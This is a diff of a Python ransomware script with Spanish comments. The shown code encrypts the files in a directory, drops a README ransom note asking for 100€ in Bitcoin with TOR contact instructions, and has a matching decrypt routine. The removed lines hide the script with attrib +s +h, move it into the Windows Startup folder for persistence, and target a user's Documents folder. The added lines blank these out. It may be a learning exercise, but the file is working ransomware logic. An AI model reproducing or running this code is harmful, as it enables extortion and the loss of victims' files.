@@ -4,9 +4,9 @@ import time
 
 
 
-os.system('attrib +s +h C:\Users\Aaron\Downloads\xe-ransom.py')
+os.system('esconder carpeta')
 
-os.system('MOVE C:\Users\Aaron\Downloads\xe-ransom.py C:\Users\Aaron\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+os.system('MOVER carpeta ')
 
 
 # Extensión para los archivos encriptados.
@@ -44,7 +44,7 @@ if __name__ == '__main__':
 
     try:
         # Directorio que vamos a cifrar.
-        path_to_encrypt = 'C:\\Users\\aaron\\Documents'
+        path_to_encrypt = ''
 
         # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
         items = os.listdir(path_to_encrypt)
@@ -58,7 +58,7 @@ if __name__ == '__main__':
         encrypt(full_path, key)
 
         # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
-        with open( path_to_encrypt + '\\README.txt', 'w') as file:
+        with open( path_to_encrypt + 'README.txt', 'w') as file:
             file.write('Los archivos de su systemas han sido encryptados.\n Si quiere recuperar sus archivos realizar pago de 100€ a la direccion de Bitcoin:a0asdd90s788ds8ds78ffsfds89g \n Puedes contactar conmigo en el chat de la siguiente web de TOR, debe instalar dicho navegador para acceder. Codigo para el buscador TOR: 1crhbhjkfdbv483c4398cn')
             
     except Exception as e:
@@ -112,14 +112,14 @@ if __name__ == '__main__':
     try:
 
         # Directorio que vamos a cifrar.
-        path_to_decrypt = 'C:\\Users\\aaron\\Documents'
+        path_to_decrypt = ''
 
         # Eliminamos el archivo típico con el mensaje solicitando el rescate.
-        os.remove(path_to_decrypt + '\\README.txt')
+        os.remove(path_to_decrypt + '/README.txt')
 
         # Obtener los archvios del directorio para su descifrado y se guarda en una lista.
         items = os.listdir(path_to_decrypt)
-        full_path = [path_to_decrypt + '\\' + item for item in items]
+        full_path = [path_to_decrypt + '/' + item for item in items]
 
         # Obtener la contraseña utiliada para el cifrado.
         key = cargar_key()
